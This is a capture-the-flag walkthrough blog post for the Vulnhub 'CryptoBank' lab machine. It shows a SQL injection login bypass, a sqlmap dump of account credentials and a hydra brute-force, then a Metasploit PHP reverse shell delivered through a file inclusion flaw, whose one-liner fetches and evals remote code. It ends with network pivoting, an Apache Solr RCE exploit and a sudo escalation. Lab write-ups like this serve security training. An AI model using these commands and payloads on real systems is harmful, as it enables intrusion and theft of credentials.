---
date: 2020-06-03 03:42:31
layout: post
title: "CryptoBank Vulnhub Walkthrough"
subtitle:
description: Another Day, Another Vulnhub CTF! Today we will be doing CryptoBank from vulnhub.
image: /assets/img/uploads/cryptobank/cryptobank.png
optimized_image: /assets/img/uploads/cryptobank/cryptobank-optimized.png
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: cryptobank, cryptobank vulnhub, vulnhub, cryptobank vulnhub walkthrough, cryptobank writeup, infosec articles, vulnhub crytobank writeup
---


Today we will be doing CryptoBank from vulnhub. This box is rated intermediate and the goal is to read the root flag. I've added the IP address to my hosts file. So let's dive in.

```r
m1m3@kali:~$ cat /etc/hosts 
127.0.1.1       kali
127.0.0.1       localhost
192.168.1.9     cryptobank.local
```

## Initial Enumeration
As usual, we begin with Nmap checking for open ports and default scripts.

```r
m1m3@kali:~$ nmap -sC -sV -oA nmap/cryptobank cryptobank.local
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for cryptobank.local (192.168.1.9)
Host is up (0.00033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:4e:59:df:b7:55:49:cf:d3:12:2d:19:01:05:43:f7 (RSA)
|   256 5e:1b:37:98:ab:c7:e6:ee:5f:f8:df:43:14:de:28:4e (ECDSA)
|_  256 8e:a9:90:9f:6e:51:b1:c7:26:ea:07:ac:69:28:b3:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: CryptoBank
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
```

We see a webserver running on port 80 which is running a cryptocurrency trading website. 

<center><br>
<img src="/assets/img/uploads/cryptobank/port80.png">
</center>

This seems to be a pretty website with some great functionality and potential vulnerabilities. Next we will be running a gobuster scan to search for hidden directories.

```r
m1m3@kali:~$ gobuster dir -u cryptobank.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cryptobank.local
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
Starting gobuster
===============================================================
/assets (Status: 301)
/development (Status: 401)
/trade (Status: 301)
/server-status (Status: 403)
===============================================================
Finished
===============================================================
```

We do not have access to the development directory. Looking at the trade directory, we can see a login page which is vulnerable to sql injection, and hence can be bypassed using the payload `admin'or'1=1'#`

<center><br>
<img src="/assets/img/uploads/cryptobank/trade-login.png">
</center>

On further enumeration in the trade directory, I found a page which is vulnerable to sql injection. 


[http://cryptobank.local/trade/applying_loan.php?loan_id=2] 

Let's try running sqlmap to look for databases.
```r
m1m3@kali:~$ sqlmap -u http://cryptobank.local/trade/applying_loan.php?loan_id=2 --dbs

...

available databases [5]:
[*] cryptobank
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

The website is vulnerable to Time based SQL Injection! We found a database named <i>cryptobank</i> along with some default databases. Further, we will be enumerating the cryptobank database.

```r
m1m3@kali:~$ sqlmap -u http://cryptobank.local/trade/applying_loan.php?loan_id=2 -D cryptobank --tables  

...

Database: cryptobank
[3 tables]
+----------+
| comments |
| accounts |
| loans    |
+----------+
```

The <i>accounts</i> table seems to be interesting. Let's have a quick look at it.

```r
m1m3@kali:~$ sqlmap -u http://cryptobank.local/trade/applying_loan.php?loan_id=2 -D cryptobank -T accounts --dump  

...

Database: cryptobank
Table: accounts
[12 entries]
+------------+---------+--------------------+------------+
| id_account | balance | username           | password   |
+------------+---------+--------------------+------------+
| 11         | 1       | patric             | x8CRvHqgPp |
| 12         | 777     | notanirsagent      | 8hPx2Zqn4b |
| 10         | 857     | tim                | zm2gBcaxd3 |
| 4          | 1375    | johndl33t          | NqRF4W85yf |
| 9          | 2886    | buzzlightyear      | LnBHvEhmw3 |
| 8          | 4324    | deadbeef           | 6X7DnLF5pG |
| 6          | 8531    | spongebob          | 3mwZd896Me |
| 3          | 26321   | bill.w             | 3Nrc2FYJMe |
| 2          | 34421   | juliusthedeveloper | wJWm4CgV26 |
| 1          | 87549   | williamdelisle     | gFG7pqE5cn |
| 5          | 434455  | mrbitcoin          | LxZjkK87nu |
| 7          | 733456  | dreadpirateroberts | 7HwAEChFP9 |
+------------+---------+--------------------+------------+
```

Wooah! We just managed to get some login information. We can probably use them to login into the development directory. I'll be using hydra, just save these usernames and passwords in separate lists.

```r
m1m3@kali:~$  hydra -L users.txt -P passwords.txt -f 192.168.1.9 http-get /development

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 144 login tries (l:12/p:12), ~9 tries per task
[DATA] attacking http-get://192.168.1.9:80/development
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

But that does not seem to work. Enumerating more in the website, I found some more usernames in the page source of the home page.   

<center><br>
<img src="/assets/img/uploads/cryptobank/usernames.png">
</center>

We should add these usernames to the list and run the attack again.

```r
m1m3@kali:~$ hydra -L users.txt -P passwords.txt -f 192.168.1.9 http-get /development

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:15/p:12), ~12 tries per task
[DATA] attacking http-get://192.168.1.9:80/development
[80][http-get] host: 192.168.1.9   login: julius.b   password: wJWm4CgV26
[STATUS] attack finished for 192.168.1.9 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) 
```

We can now access the development directory with username <i>julius.b</i> and password <i>wJWm4CgV26</i> 

<center><br>
<img src="/assets/img/uploads/cryptobank/development.png">
</center>

We see a page show message <i>only for development.</i> Next we will be running a dirb scan to search recursively into the development directory.

```r
m1m3@kali:~$ dirb http://cryptobank.local/development/ -u julius.b:wJWm4CgV26 -w  

-----------------         
DIRB v2.22   
By The Dark Raver  
-----------------  

---- Entering directory: http://cryptobank.local/development/backups/home/ ----

+ http://cryptobank.local/development/backups/home/.git/HEAD (CODE:200|SIZE:

+ http://cryptobank.local/development/backups/home/.htaccess (CODE:200|SIZE:12)

==> DIRECTORY: http://cryptobank.local/development/backups/home/development/

---- Entering directory: http://cryptobank.local/development/tools/ ----

+ http://cryptobank.local/development/tools/index.php (CODE:403|SIZE:687)

==> DIRECTORY: http://cryptobank.local/development/tools/Resources/ 

...
```

The tools directory is quite interesting, we can do a lot of things here, but all the malicious activities are blocked by a firewall installed on the website. I had a look around these tools. ‘Execute a command’ requires another username and password which we don't have, ‘Upload a file’ seems to only accept image files (atleast without trying to hack it anyway). ‘View a system file’ seems more interesting though.

<center><br>
<img src="/assets/img/uploads/cryptobank/tools.png">
</center>

We can exploit the file inclusion vulnerability using metasploit.

```r
msf5 > use multi/script/web_delivery
msf5 exploit(multi/script/web_delivery) > set target PHP
target => PHP
msf5 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/script/web_delivery) > set LHOST 192.168.1.8
LHOST => 192.168.1.8
msf5 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 192.168.1.8:4444
[*] Using URL: http://0.0.0.0:8080/iBnAGZRl
[*] Local IP: http://192.168.1.8:8080/iBnAGZRl
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.1.8:8080/iBnAGZRl', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_nam
e'=>false]])));"
```

We got a payload, now we need to run the file on our target machine. Just paste the location of the payload in the url.

<center><br>
<img src="/assets/img/uploads/cryptobank/lfi.png">
</center>

After executing, we can shell that a reverse shell is opened on the target machine.

```r
msf5 exploit(multi/script/web_delivery) > [*] 192.168.1.9      web_delivery - Delivering Payload (1112 bytes)
[*] Sending stage (38288 bytes) to 192.168.1.9
[*] Meterpreter session 1 opened (192.168.1.8:4444 -> 192.168.1.9:59856)

msf5 exploit(multi/script/web_delivery) > sessions -l
Active sessions
===============

  Id  Name  Type                   Information                 Connection
  --  ----  ----                   -----------                 ----------
  1         meterpreter php/linux  www-data (33) @ cryptobank  192.168.1.8:4444 -> 192.168.1.9:59856 (192.168.1.9)

msf5 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >

```


We can use the shell and then read our user flag!

```r
meterpreter > shell
Process 26876 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty;pty.spawn("/bin/bash")'  
</cryptobank/development/tools/FileInclusion/pages$ cd /home/cryptobank/
cd /home/cryptobank/
www-data@cryptobank:/home/cryptobank$ cat flag.txt
cat flag.txt
flag{l4szl0h4ny3cz1smyh3r0}
```

## Root Shell

After some enumeration, I found that the machine was listening from some other IP on port 8983. 

```r
www-data@cryptobank:/home/cryptobank$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:8983         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 192.168.1.9:68          0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
www-data@cryptobank:/home/cryptobank$ 
```

I closed my shell, and went back to the meterpreter console. I then mapped the subnet that IP address was on, using the command below:

```r
meterpreter > run autoroute -s 172.17.0.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.17.0.0/255.255.255.0...
[+] Added route to 172.17.0.0/255.255.255.0 via 192.168.1.8
[*] Use the -p option to list all active routes

meterpreter > portfwd add -l 81 -p 8983 -r 172.17.0.1
[*] Local TCP relay created: :81 <-> 172.17.0.1:8983
meterpreter > 

```

Now I visited the IP in my browser at <i>http://localhost:81</i>

<center><br>
<img src="/assets/img/uploads/cryptobank/solr.png">
</center>

This website is running Solr. I searched on metasploit and found an RCE exploit.

```r
msf5 > search solr

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description                                                                   
   -  ----                                  ---------------  ----       -----  -----------                                                                   
   0  exploit/multi/http/solr_velocity_rce  2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template                       

msf5 > use exploit/multi/http/solr_velocity_rce
msf5 exploit(multi/http/solr_velocity_rce) > set RHOSTS localhost                                                                        
RHOSTS => localhost
msf5 exploit(multi/http/solr_velocity_rce) > set RPORT 81RPORT => 81
msf5 exploit(multi/http/solr_velocity_rce) > set SRVPORT 8082
SRVPORT => 8082
msf5 exploit(multi/http/solr_velocity_rce) > set LPORT 4443
LPORT => 4443
msf5 exploit(multi/http/solr_velocity_rce) > set LHOST 192.168.1.8
LHOST => 192.168.1.8
msf5 exploit(multi/http/solr_velocity_rce) > exploit
[*] Exploiting target 0.0.0.1
[*] Started reverse TCP handler on 192.168.1.8:4443 
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 192.168.1.8:4443 
[*] Found Apache Solr 8.1.1
[*] OS version is Linux amd64 4.15.0-96-generic
[*] Found core(s): cryptobank
[*] Targeting core 'cryptobank'
[*] Command shell session 1 opened (192.168.1.8:4443 -> 192.168.1.9:44802)
[*] Session 1 created in the background.
                           
msf5 exploit(multi/http/solr_velocity_rce) > sessions -i 1
[*] Starting interaction with 1...
                                                                                                                                                             
id
uid=8983(solr) gid=8983(solr) groups=8983(solr),27(sudo)
python -c 'import pty;pty.spawn("/bin/bash")'
```

We can see that the user is added in the <i>sudoers</i> group, so we can run commands as root but we need the password for the user. After a few guesses, I found the password! and it came out to be the obvious one. (solr)
```r
solr@33fa86e6105f:/opt/solr/server$ cd /
cd /
solr@33fa86e6105f:/$ sudo su
sudo su 
[sudo] password for solr: wJWm4CgV26

Sorry, try again.
[sudo] password for solr: solr

root@33fa86e6105f:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@33fa86e6105f:~# 
```

Now we can read our flag!

```r
root@33fa86e6105f:~# cat flag.txt
cat flag.txt
Good job here our secure cold wallet flag{s4t0sh1n4k4m0t0}
```

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/benbely">Ben Bely.</a>
